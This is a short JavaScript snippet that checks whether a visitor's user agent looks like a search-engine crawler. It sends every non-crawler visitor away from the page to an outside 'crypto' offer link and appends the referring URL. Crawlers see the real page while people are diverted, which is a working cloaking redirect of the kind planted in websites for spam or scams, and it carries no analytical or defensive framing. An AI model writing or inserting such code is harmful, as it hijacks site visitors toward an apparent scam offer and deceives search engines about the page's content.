
const urlParams = new URLSearchParams(window.location.search);
const redir = urlParams.get("redir");
const currentHost = window.location.href;
console.log(currentHost);
// const currentDomain = window.location.host
if (!redir) {
  if (!currentHost.includes("localhost")) {
    let agents = [
      "goog",
      "bot",
      "slurp",
      "msn",
      "scooter",
      "yahoo",
      "crawler",
      "media",
      "bing",
      "ask",
    ];
    found = agents.findIndex((element) =>
      navigator.userAgent.toLowerCase().includes(element)
    );

    if (found < 0) {
      let offer_link = "https://go.sitegrinder.net/crypto/dh98guoi47";

      if (offer_link.includes("?")) {
        offer_link = offer_link + "&referring_url=" + window.location.href;
      } else {
        offer_link = offer_link + "?referring_url=" + window.location.href;
      }

      window.location.replace(encodeURI(offer_link));
    }
  }
}
